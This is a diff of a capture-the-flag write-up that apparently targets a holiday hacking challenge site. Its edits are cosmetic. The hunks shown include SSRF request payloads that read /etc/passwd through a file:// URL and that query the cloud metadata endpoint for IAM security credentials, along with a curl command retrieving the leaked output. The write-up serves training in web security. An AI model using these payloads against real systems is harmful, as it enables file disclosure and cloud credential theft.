@@ -18,7 +18,7 @@ Dr. Petabyte told us, "anytime you see URL as an input, test for SSRF."
 The first GET we tried was the one in home page required to apply for a position. 
 <br/>[https://apply.jackfrosttower.com/?p=apply](https://apply.jackfrosttower.com/?p=apply)
 
-and of course we love BurpSuite for the web challenges so  we [configure our browser](https://portswigger.net/burp/documentation/desktop/external-browser-config/browser-config-firefox) to pass through the proxy for our convenience (even if you can do everything just by using the browser)
+and of course we love BurpSuite for the web challenges so we [configure our browser](https://portswigger.net/burp/documentation/desktop/external-browser-config/browser-config-firefox) to pass through the proxy for our convenience (even if you can do everything just by using the browser)
 
 
 Let's submit the Form Request and, of course, we try immediately the field `inputWorkSample` because Dr. Petabyte Docet !
@@ -26,7 +26,6 @@ Let's submit the Form Request and, of course, we try immediately the field `inpu
 GET /?inputName=aa&inputEmail=aa%40me.it&inputPhone=aa&inputField=Bedtime+violation&resumeFile=&inputWorkSample=file:///etc/passwd&additionalInformation=bbb&submit= HTTP/2
 Host: apply.jackfrosttower.com
 User-Agent: This field can be used like the "Evil Bit" 2.0. Absolutely NOT malicious! 
-User-Agent: This field can be used like the "Evil Bit" 2.0 
 ```
 
 <br>
@@ -83,7 +82,7 @@ Host: apply.jackfrosttower.com
 User-Agent: This field can be used like the "Evil Bit" 2.0. Absolutely NOT malicious! 
 ```
 
-and see the results in our /images/aa.jpg so kindly offered :)
+And see the results in our /images/aa.jpg so kindly offered :)
 ```
 curl https://apply.jackfrosttower.com/images/aa.jpg
 ami-id
@@ -98,7 +97,7 @@ instance-action
 ```
 
 ### SecretAccessKey
-and if we applied what we learnt in the prechallenge about `IMDS 1` and `security-credentials`. 
+And if we applied what we learnt in the prechallenge about `IMDS 1` and `security-credentials`. 
 ```
 GET /?inputName=aa&inputEmail=aa%40me.it&inputPhone=aa&inputField=Bedtime+violation&resumeFile=&inputWorkSample=http://169.254.169.254/latest/meta-data/iam/security-credentials/jf-deploy-role&additionalInformation=
 Host: apply.jackfrosttower.com
